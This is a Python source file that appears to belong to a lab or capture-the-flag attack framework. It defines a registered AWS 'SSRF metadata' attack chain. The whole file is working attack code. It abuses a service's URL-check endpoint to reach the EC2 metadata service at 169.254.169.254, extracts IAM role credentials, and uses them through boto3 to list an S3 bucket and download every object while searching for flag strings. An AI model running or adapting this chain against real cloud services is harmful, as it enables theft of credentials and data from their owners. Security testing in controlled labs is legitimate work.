
import json
import re
from typing import Any
from vault.attacks.base import BaseAttackChain, AttackResult
from vault.attacks import register_attack

try:
    import requests
    import boto3
    HAS_DEPENDENCIES = True
except ImportError:
    HAS_DEPENDENCIES = False


@register_attack("aws", "ssrf-metadata")
class SSRFMetadataAttack(BaseAttackChain):
    def __init__(self, outputs: dict[str, Any], verbose: bool = False, log_file: str | None = None):
        super().__init__(outputs, verbose, log_file)
        self.credentials: dict[str, str] = {}
        
    def run(self) -> list[AttackResult]:
        if not HAS_DEPENDENCIES:
            self.log_phase("Dependency Check", False, 
                         "Missing required packages: requests, boto3")
            return self.results
        
        if not self._test_ssrf():
            self.save_log()
            return self.results
            
        if not self._extract_credentials():
            self.save_log()
            return self.results
            
        if not self._enumerate_s3():
            self.save_log()
            return self.results
            
        self._exfiltrate_data()
        self.save_log()
        
        return self.results
    
    def _test_ssrf(self) -> bool:
        try:
            service_url = self.outputs.get('service_url')
            if not service_url:
                self.log_phase("SSRF Test", False, "No service_url in outputs")
                return False
            
            self.log_verbose(f"Testing service health endpoint: {service_url}/health")
            resp = requests.get(f"{service_url}/health", timeout=10)
            self.log_verbose(f"Health check response: {resp.status_code}", resp.text)
            
            if resp.status_code == 200:
                self.log_phase("Service Check", True, "Service is accessible")
                
                metadata_url = "http://169.254.169.254/latest/meta-data/"
                ssrf_target = f"{service_url}/check?url={metadata_url}"
                self.log_verbose(f"Testing SSRF via: {ssrf_target}")
                
                resp = requests.get(ssrf_target, timeout=10)
                self.log_verbose(f"SSRF response status: {resp.status_code}")
                self.log_verbose("SSRF response body:", resp.text[:500])
                
                if "iam" in resp.text.lower() or "security-credentials" in resp.text.lower():
                    self.log_phase("SSRF Vulnerability", True, "Successfully accessed EC2 metadata")
                    return True
                else:
                    self.log_phase("SSRF Test", False, "Metadata not accessible via SSRF")
                    return False
            else:
                self.log_phase("Service Check", False, f"Service returned status {resp.status_code}")
                return False
                
        except Exception as e:
            self.log_verbose(f"Exception during SSRF test: {str(e)}")
            self.log_phase("SSRF Test", False, f"Error: {str(e)}")
            return False
    
    def _extract_credentials(self) -> bool:
        try:
            service_url = self.outputs.get('service_url')
            instance_role = self.outputs.get('instance_role')
            
            if not instance_role:
                self.log_phase("Credential Extraction", False, "No instance_role in outputs")
                return False
            
            creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{instance_role}"
            ssrf_target = f"{service_url}/check?url={creds_url}"
            
            self.log_verbose(f"Extracting credentials from: {ssrf_target}")
            resp = requests.get(ssrf_target, timeout=10)
            self.log_verbose(f"Credential response status: {resp.status_code}")
            self.log_verbose("Raw credential response:", resp.text[:500])
            
            creds = self._parse_credentials(resp.text)
            
            if creds:
                self.log_verbose("Parsed credentials successfully", {
                    "AccessKeyId": creds['AccessKeyId'][:16] + "...",
                    "Expiration": creds.get('Expiration', 'N/A')
                })
                self.log_phase("Credential Extraction", True, 
                             "Successfully extracted IAM credentials",
                             {"access_key": creds['AccessKeyId'][:16] + "..."})
                self.credentials = creds
                return True
            else:
                self.log_phase("Credential Extraction", False, "Failed to parse credentials")
                return False
                
        except Exception as e:
            self.log_verbose(f"Exception during credential extraction: {str(e)}")
            self.log_phase("Credential Extraction", False, f"Error: {str(e)}")
            return False
    
    def _parse_credentials(self, text: str) -> dict[str, str] | None:
        try:
            flask_response = json.loads(text)
            if 'content_preview' in flask_response:
                text = flask_response['content_preview']
            
            creds = json.loads(text)
            if all(k in creds for k in ['AccessKeyId', 'SecretAccessKey', 'Token']):
                return creds
            return None
        except Exception as e:
            self.log_verbose(f"Credential parse error: {e}")
            return None
    
    def _enumerate_s3(self) -> bool:
        try:
            target_bucket = self.outputs.get('data_bucket')
            if not target_bucket:
                self.log_phase("S3 Enumeration", False, "No data_bucket in outputs")
                return False
            
            self.log_verbose(f"Creating boto3 session with extracted credentials")
            session = boto3.Session(
                aws_access_key_id=self.credentials['AccessKeyId'],
                aws_secret_access_key=self.credentials['SecretAccessKey'],
                aws_session_token=self.credentials['Token'],
                region_name='us-gov-east-1'
            )
            s3 = session.client('s3')
            
            self.log_verbose(f"Testing access to bucket: {target_bucket}")
            response = s3.list_objects_v2(Bucket=target_bucket, MaxKeys=1)
            
            object_count = response.get('KeyCount', 0)
            self.log_verbose(f"Bucket listing successful, found {object_count} objects (showing first)")
            
            self.log_phase("S3 Enumeration", True, 
                         f"Confirmed access to bucket: {target_bucket}")
            return True
                
        except Exception as e:
            self.log_verbose(f"S3 enumeration exception: {str(e)}")
            self.log_phase("S3 Enumeration", False, f"Error: {str(e)}")
            return False
    
    def _exfiltrate_data(self) -> bool:
        try:
            session = boto3.Session(
                aws_access_key_id=self.credentials['AccessKeyId'],
                aws_secret_access_key=self.credentials['SecretAccessKey'],
                aws_session_token=self.credentials['Token'],
                region_name='us-gov-east-1'
            )
            s3 = session.client('s3')
            
            bucket = self.outputs.get('data_bucket')
            self.log_verbose(f"Listing all objects in bucket: {bucket}")
            objects = s3.list_objects_v2(Bucket=bucket)
            
            total_objects = len(objects.get('Contents', []))
            self.log_verbose(f"Found {total_objects} objects to exfiltrate")
            
            exfiltrated = []
            for obj in objects.get('Contents', []):
                try:
                    key = obj['Key']
                    self.log_verbose(f"Downloading: s3://{bucket}/{key}")
                    
                    data = s3.get_object(Bucket=bucket, Key=key)
                    content = data['Body'].read().decode('utf-8')
                    
                    has_flag = 'FLAG{' in content
                    flag = None
                    if has_flag:
                        flag_match = re.search(r'FLAG\{[^}]+\}', content)
                        if flag_match:
                            flag = flag_match.group(0)
                            self.log_verbose(f"FLAG FOUND in {key}: {flag}")
                    
                    exfiltrated.append({
                        'key': key, 
                        'size': len(content),
                        'has_flag': has_flag,
                        'flag': flag,
                        'content': content
                    })
                    
                    self.log_verbose(f"Downloaded {len(content)} bytes from {key}")
                except Exception as e:
                    self.log_verbose(f"Failed to download {obj['Key']}: {e}")
                    continue
            
            self.log_phase("Data Exfiltration", True, 
                         f"Exfiltrated {len(exfiltrated)} objects",
                         {"files": exfiltrated})
            return True
            
        except Exception as e:
            self.log_verbose(f"Data exfiltration exception: {str(e)}")
            self.log_phase("Data Exfiltration", False, f"Error: {str(e)}")
            return False